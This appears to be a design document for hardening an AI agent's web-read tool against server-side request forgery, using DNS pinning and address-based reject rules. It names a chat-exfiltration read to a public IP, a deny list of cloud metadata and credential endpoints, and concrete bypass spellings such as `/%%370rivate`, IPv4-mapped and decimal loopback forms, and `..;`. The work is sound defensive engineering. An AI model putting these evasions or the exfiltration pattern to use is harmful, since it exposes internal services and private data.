## Context

See `proposal.md` for motivation. The shipped web read
(`apps/api/src/tools/web-read/`) runs every request of a call — the submitted
locator, redirect hops, and the pipeline's alternate, suffix, and `llms.txt`
probes — through one fetch session: `fetchLocator` → `requestDocument` →
`deps.fetch(url, { redirect: 'manual', credentials: 'omit', signal })`, with
`deps.fetch` the runtime's `globalThis.fetch` unless a test binds one
(`http-client.ts`, `execute.ts`). Hops and probes are admitted through
`createDerivedAdmission` (`admission.ts`), which calls the synchronous
`evaluatePermission` with the `read` projection and reports each decision to
run execution through `context.onDerivedDecision`. The evaluator checks every
reject before any allow; a whole-tool allow admits whatever no reject matched
(`evaluator.ts:93-111`). Nothing resolves a host: the connection goes wherever
the runtime's own lookup sends it.

Inspected versions: Node 22.23.2 with bundled undici 6.28.0; `undici` 6.28.0,
7.29.0, and 8.10.0 are already in the lockfile (8.10.0 declares
`node >=22.19.0`, the repository's own floor). Permission regexes compile with
`re2js` (`permissions/matcher.ts`).

Two bounded spikes (throwaway scripts, not committed) settled the contract-
shaping facts:

- **Pinning.** An undici `Agent({ connect: { lookup } })` passed as `dispatcher`
  connects only to what the hook returns; Node calls the hook with
  `{ all: true, hints: 32 }` because address racing (Happy Eyeballs) is on, so
  the hook receives and returns the whole set; Node's global `fetch` accepts an
  npm undici `Agent`; and **an IP-literal host never reaches the hook**, so a
  hook-only check would miss `https://127.0.0.1/`. Undici 8.10.0's own `fetch`
  and `Agent` behave identically on the hook and the IP-literal points.
- **Recommended rows.** F5a–F5f compiled with `re2js` agree with a
  `net.BlockList` of the internal ranges on 273,038 address locators (every
  IPv4 first × second octet at third/fourth-octet boundaries, IPv6 boundary
  first hextets, with and without a port), match no hostname text, and are at
  most 145 characters. `net.BlockList` also matches IPv4-mapped IPv6 against
  IPv4 subnets.

## Goals / Non-Goals

**Goals:**

- An operator's `read` rejects hold for the address a request actually
  connects to, whatever name, resolver, redirect, or probe led there.
- The address judged is the address dialed, with no second resolution.
- Allow semantics and every existing configuration keep their meaning.

**Non-Goals:**

- A code-owned range guard, CNAME evaluation, or a permission-language range
  construct (#942). See `proposal.md` for the rest.

## Decisions

### D1: Policy is the only mechanism

- **Decision**: resolved addresses are judged by the operator's `read` group
  and nothing else. The recommended example carries the defaults (D10).
- **Alternatives rejected**: a built-in loopback/private/metadata guard, as
  OpenClaw and Gemini CLI ship (`2026-09-22-web-read/design.md`, Prior art):
  it refuses the localhost and LAN reads the owner's own development needs, and
  exempting them needs a second configuration surface. A guard plus policy:
  the same cost, and two enforcement languages.
- **Consequence**: an operator whose policy has no address-matching reject is
  unprotected exactly as today. The changelog tells operators to copy the new
  rows.

### D2: The address locator is the requested URL with the host replaced

- **Decision**: `https://docs.example.com:8443/guide?q=1` resolving to
  `93.184.216.34` is also matched as `https://93.184.216.34:8443/guide?q=1`.
  The text is exactly the URL the request uses: a read selector is never
  requested, so it is not part of it, and a `$`-anchored address reject
  cannot be evaded with `:raw`. IPv4 is dotted decimal; IPv6 is bracketed in
  its WHATWG serialization (lowercase, compressed); an IPv4-mapped IPv6
  address is written as the dotted IPv4 it maps, in both forms it arrives in
  (the URL parser's `[::ffff:7f00:1]` and the resolver's `::ffff:127.0.0.1`),
  since a `^https?://127\.` reject would miss either; an IPv6 zone identifier
  is dropped, since a URL cannot carry one. `0.0.0.0` and `::` are judged as
  written, although the platform connects them to loopback. An IP-literal host
  produces its own address locator the same way, so
  `https://[::ffff:169.254.169.254]/` is also matched as
  `https://169.254.169.254/`.
- **Alternatives rejected**: origin only (`https://93.184.216.34:8443/`),
  which fits entirely inside a shared connection pool's lookup hook but
  cannot express the owner's path-scoped address rule
  (`^https?://10\.67\.88\.60/private`).
- **Consequence**: connections cannot be shared between requests (D6).

### D3: Address locators are judged by rejects only

- **Decision**: an address is refused when a reject matches its address
  locator (or the evaluation hits `input_limit`), and admitted otherwise; an
  allow is never decided on an address locator.
- **Alternatives rejected**: full evaluation. Under an allow-all group it is
  identical. Under the documented domain allowlist
  (`^https://docs\.example\.com/`), every CDN-hosted address matches no allow,
  so every read fails `no_allow` unless the operator adds a broad address
  allow such as `^https://\d+\.\d+\.\d+\.\d+/` — and allows also match the
  submitted text, so that clause admits `read https://45.33.1.2/?d=<chat>`,
  reopening the exfiltration path the allowlist exists to close.
- **Consequence**: the existing two-text rule (a reject fires on either text,
  the allow on the requested one) gains a third, reject-only text. "Admit this
  name only at this address" is expressible only as rejects of the others.

### D4: One system-resolver answer per host per call; no CNAME walk

- **Decision**: `dns.promises.lookup(host, { all: true, order: 'verbatim' })`
  once per host per call, memoized in the fetch session keyed by the
  canonical ASCII host; later requests of the call to that host reuse the
  answer. Resolution runs inside the request's header bound and the call bound
  (it starts after `requestStarted`), raced against the call's abort signal.
  A resolution failure becomes `network_error` with a fixed message, because
  `getaddrinfo`'s own message names the host, which on a hop is server-chosen
  text that today never reaches the model.
- **Consequence**: the lookup precedes the address decision, so a read whose
  text is admitted sends its hostname labels to the zone's authoritative
  server even when every address is then refused. Under the old F5 a
  cleartext locator was refused on its text with no lookup; under F5a–F5f it
  is looked up first. Address rules cannot bound DNS as an outbound channel;
  only text rules can, and the runbook says so.
- **Alternatives rejected**: c-ares (`dns.resolve*`) to expose the CNAME chain:
  it bypasses hosts files and the platform's name service, so pinning to its
  answer breaks names only the system resolver knows, and a CNAME rule is
  bypassed by an A record with the same address. Resolving per request: a
  short-TTL zone could answer the page and its probe with different addresses
  under one `finalUrl`.

### D5: Filter every address, then race the admitted set

- **Decision**: every resolved address is judged; refused ones are dropped and
  the admitted set, in resolver order, is what the connection may use. The
  runtime's address racing and connect-phase failover then run unchanged over
  that set; TLS, header, and HTTP failures end the request as today. An empty
  admitted set issues no request (the refused-address outcome).
- **Alternatives rejected**: judging only the address about to be dialed,
  sequentially with a per-attempt connect timeout: it gives up address racing
  (a broken IPv6 route costs a full connect timeout per read) and needs
  llame-owned failover. Ending the call at the first refused address: a zone
  could make its own reads fail by listing one refused address first.
- **Consequence**: connect-phase failover across admitted addresses is part of
  one request, not a retry, which the no-retry bound already permits: it is
  what the runtime does today.

### D6: Pinning through a per-request undici dispatcher

- **Decision**: add `undici` 8.x as a direct `apps/api` dependency and issue
  every web request through undici's own `fetch` with a per-request
  `Agent({ connect: { lookup } })`. The hook returns exactly the request's
  admitted addresses and fails closed for any other host name; it answers in
  the shape Node asked for (an array when `all` is set, a single address and
  family otherwise), so disabling address racing does not break reads. Because
  an IP-literal host skips the hook, its admission happens before the
  request, in the same step that judges resolved addresses. `allowH2` is set
  to `false`: undici 8 enables HTTP/2 by default where the runtime's bundled
  undici 6 does not, and this change does not move web reads to HTTP/2. A web
  request never goes through an environment-configured proxy, since a proxy
  would make the hook judge the proxy's address instead of the target's; the
  runbook states it. The session closes every agent it created on `dispose`,
  after the body has been read or cancelled.
- **Alternatives rejected**:
  - `globalThis.fetch` with an npm undici `Agent`: works today (spike), but
    couples the dispatcher to whichever undici the running Node bundles, so a
    Node upgrade can break the web read silently. Undici's own `fetch` and
    `Agent` come from one package version.
  - `node:http`/`node:https` with a `lookup` option: a rewrite of the client's
    streaming, abort, and redirect handling for no added property.
  - One shared agent: it pools sockets per origin, and a reused socket skips
    the hook, so a socket admitted for `/x` would serve `/y` (D2).
- **Consequence**: each request pays its own TCP and TLS handshake; a call
  issues at most 27 requests and usually one to five. `deps.fetch` stays the
  test seam, now typed as undici's `fetch`; a `resolve` dependency joins it so
  tests script resolver answers.

### D7: Reuse the evaluator; no second decision path

- **Decision**: an address locator is evaluated by the existing
  `evaluatePermission` with the `read` projection and `args: { path }`, like
  any derived locator, and the reject-only rule is a mapping of its result:
  `explicit_reject` and `input_limit` refuse, `allow` and `no_allow` admit. A
  whole-tool reject or `invalid_field` cannot reach this point, because the
  call itself was admitted by the same group. A context without a compiled
  policy refuses every address before any mapping, so the existing
  `NO_POLICY` fail-closed sentinel (a `no_allow` with an empty policy id) is
  never read as an admit.
- **Alternatives rejected**: a reject-only entry point in the evaluator: a
  second evaluation path whose drift from the first would itself be a bypass.

### D8: Escapes are normalized to a fixed point

- **Decision**: `canonicalHref` normalizes path and query escapes in one pass
  that yields a fixed point: a `%` that does not begin a valid escape becomes
  `%25`; an escape of an unreserved character (RFC 3986 §6.2.2.2: `A-Z`,
  `a-z`, `0-9`, `-`, `.`, `_`, `~`) is decoded; every other escape stays,
  with uppercase hex (§6.2.2.1). The result re-serializes through the URL
  parser, so a decoded `.` segment is resolved as the parser resolves `%2e`.
  Encoding the stray `%` first is what makes the pass safe: a single decode of
  `/%%370rivate` would otherwise produce `/%70rivate`, a new escape that the
  server reads as `/private`; with it the text becomes `/%2570rivate`, whose
  server-decoded path is the literal `/%70rivate` the model named. The
  submitted locator, hops, probes, and address locators all pass through it,
  and the request uses the same text.
- **Alternatives rejected**: a separate issue. The owner's acceptance rule
  (`^https?://10\.67\.88\.60/private`) is bypassed by `/%70rivate` without it,
  on every hostname and address alike. Decoding repeatedly until stable:
  it double-decodes `/%2570rivate` into `/private`, changing the resource.
- **Consequence**: a clause written against an encoded unreserved spelling no
  longer matches, and the unmodified "File permission matching uses logical
  resource locators" sentence forbidding a change to percent-decoding rules is
  scoped to Knowledge, skill, and host locators in the delta. Server-side
  normalizations outside RFC 3986 equivalence (`//` merged by nginx and
  Apache, Tomcat's `..;`, a component that decodes a path twice and reads
  `/%2570rivate` as `/private`) remain evasions of path-scoped rules; the runbook
  tells operators to scope a sensitive address by origin, not path.

### D9: Provenance and the model-facing outcome

- **Decision**: `DerivedLocatorKind` gains `address`; an address is reported
  to run execution only when refused, with its static reason and, when one
  matched, its clause reference, never its text. Run execution keeps one
  record per distinct refused address and decision per call and at most 16
  `address` records per call under a bound of their own, beside the existing
  26 for hops and probes (`MAX_DERIVED_DECISIONS`, one per derived request).
  A shared bound would let a zone answering with 26 refused addresses crowd
  out the hop or probe record that decided the call; deduplication stops the
  same address being recorded once per request. `pipeline.ts`'s `ProbeKind`
  excludes `address` beside `hop`. An
  empty admitted set on the call's own chain returns `permission_denied` with
  a new fixed message in `permissions/messages.ts`; a hop also carries
  `rejectedUrl` in hostname form through the existing `rejectedHopUrl`. On a
  probe's chain the pipeline's candidate rule already disqualifies a
  `permission_denied` failure (`pipeline.ts` `CANDIDATE_FAILURES`). A
  transport failure's echoed message is pinned by a test to carry no address:
  today undici wraps connect errors, whose messages list attempted addresses,
  in `TypeError('fetch failed')`, and nothing else guarantees it.
- **Alternatives rejected**: recording every address decision, which stores
  a row per resolved address per request, all admitted, under a reason the
  reject-only rule cannot name. Reusing the hop message for the submitted
  locator, which tells the model a redirect happened when none did.

### D10: Recommended rows F5a–F5f and F7

- **Decision**: F5 (`^http://`) becomes six rows that refuse cleartext only to
  an address outside `0.0.0.0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16`,
  `172.16/12`, `192.168/16`, `::`, `::1`, `fc00::/7`, and `fe80::/10`: F5a by
  first octet, F5b–F5e for the partially internal first octets `100`, `169`,
  `172`, `192`, F5f for bracketed IPv6. A hostname text never matches them, so
  a cleartext read is decided by its resolved addresses. F7 refuses the
  well-known metadata and credential endpoints that sit inside ranges F5a–F5f
  leave open: `169.254.169.254` (AWS, Azure, GCP, and others),
  `169.254.170.2` (AWS ECS task credentials, confirmed in the AWS SDK
  reference), `169.254.0.23` (Tencent Cloud), `100.100.100.200` (Alibaba
  Cloud), and `[fd00:ec2::254]` (AWS IPv6), on either scheme; the Tencent and
  Alibaba addresses are from provider knowledge not fetched in this
  environment, and a wrong entry only refuses one internal address. Exact
  regex text is in the `tool-call-permissions` delta. `0.0.0.0/8` counts as
  internal because Linux routes it to loopback and development servers print
  that address. CGNAT counts as internal because a tailnet lives there.
- **Consequence**: copying F5a–F5f widens cleartext reads. Any hostname, an
  attacker's zone or a spoofed DNS answer included, is read over plain HTTP
  when it resolves into an internal range, where the old F5 refused all
  cleartext; HTTPS certificate verification kept most such services out of
  reach before. That is the requested behavior for localhost and LAN reads;
  an operator who does not want it keeps the old F5. F5f also refuses an
  IPv4-mapped literal of an internal address on its text
  (`http://[::ffff:127.0.0.1]/` serializes to `[::ffff:7f00:1]`), which fails
  safe; `http://127.0.0.1/` is the spelling that works.
- **Proof**: a unit test compiles each row with the shipped matcher and
  compares the union against `net.BlockList` over the spike's generated
  boundary set, plus the example-matrix rows in the spec.
- **Alternatives rejected**: one complement regex (unreadable); a range
  construct in the permission language (#942, a new configuration contract).

## Threats

| Vector                                            | Handled by                                                             |
| ------------------------------------------------- | ---------------------------------------------------------------------- |
| Hostname resolving to a refused address           | D2, D5: every address judged before dialing                            |
| Answer changes between decision and connect       | D6: the hook returns the judged set, no second resolution              |
| Answer changes within a call                      | D4: one answer per host per call                                       |
| Mixed public/refused answers                      | D5: refused addresses are never dialed                                 |
| Redirect or probe into refused space              | every session request takes the same path                              |
| IP literal skipping the hook                      | D6: judged before the request                                          |
| `[::ffff:…]`, `0x7f.1`, `2130706433` spellings    | D2 mapping in both textual forms; the URL parser normalizes IPv4 forms |
| `/%70rivate`, `/%%370rivate` path evasion         | D8 fixed-point normalization                                           |
| `:raw` suffix defeating a `$` anchor              | D2: the selector is not part of the address locator                    |
| Pooled socket reused for another path             | D6: no reuse across requests                                           |
| Address or server-chosen host echoed to the model | D4, D9: fixed messages; transport echo pinned by test                  |
| Refused addresses crowding out decisive records   | D9: separate, deduplicated bound                                       |
| Environment proxy re-routing a pinned request     | D6: explicit dispatcher, no proxy                                      |

## Risks / Trade-offs

- [A public host that proxies to an internal one is invisible] → stated in the
  runbook threat model; out of scope.
- [A protected server has other addresses or interfaces] → operator rules name
  addresses; the runbook says to reject each.
- [`dns.lookup` cannot be cancelled] → the call fails on its deadline; the
  orphaned lookup holds one libuv threadpool slot until the OS resolver times
  out.
- [A handshake per request] → at most 27 per call, inside the 30 s bound.
- [NAT64 (`64:ff9b::/96`) reaches embedded IPv4 on NAT64 networks] → F5f
  refuses it for cleartext; an HTTPS rule written for an IPv4 address does not
  see the embedded form. Recorded in the runbook.
- [Case-insensitive servers serve `/Private` for `/private`] → the runbook
  recommends `(?i)` on path-scoped rules.
- [Allowlisted host `bash` reaches any address] → unchanged; the runbook says
  this check governs `read` only.
- [`0.0.0.0` and `::` reach loopback on Linux] → judged as written; the
  runbook tells an operator who rejects loopback to reject them too.
- [Server-side path normalization (`//`, `..;`)] → D8 consequence; path
  rules are advisory against such servers, origin rules are not.
- [DNS carries hostname labels out before any address decision] → D4
  consequence; only text rules bound it.
- [Copying F5a–F5f widens cleartext to internal addresses] → D10
  consequence, stated in the changelog and runbook.
- [The old F5 keeps refusing internal cleartext] → fails in the safe
  direction; the changelog names the replacement rows.

## Migration Plan

No data, schema, or API migration. Operators copy F5a–F5f and F7 from the
example to open cleartext to internal addresses and refuse the metadata
endpoints. An unchanged configuration keeps today's decisions except where a
clause was written against an encoded unreserved spelling, which D8 makes
unmatchable and the changelog tells operators to rewrite decoded.

Order matters for F5a–F5f, because they refuse public cleartext only on
address locators, which older builds never evaluate: every API and Run worker
process that can execute a web read must run this build before `^http://` is
replaced, or an older worker admits `http://example.com/`. Rollback restores
`^http://` in configuration first and reverts the implementation layer after;
the runbook and changelog state both orders.

## Revision history

- **v2 (2026-09-23):** Review round 1 (two independent reviewers). Escape
  normalization made a fixed point (stray `%` → `%25`, uppercase hex) after a
  confirmed `/%%370rivate` bypass; the selector dropped from the address
  locator; resolver-form IPv4-mapped answers covered; address records
  deduplicated under their own bound of 16; `input_limit` and the
  no-policy sentinel made explicit refusals; the probe-chain wording of the
  redirect requirement corrected; F7 extended to the ECS, Tencent, and
  Alibaba endpoints; `allowH2: false`, both hook call shapes, and no
  environment proxy stated; the F5a–F5f widening, DNS lookup exposure,
  `0.0.0.0`/`::`, and server-side path normalization recorded as risks; the
  percent-decoding sentence in "File permission matching uses logical
  resource locators" scoped; falsifiable reuse and never-dialed tests.
- **v1 (2026-09-23):** Initial draft.
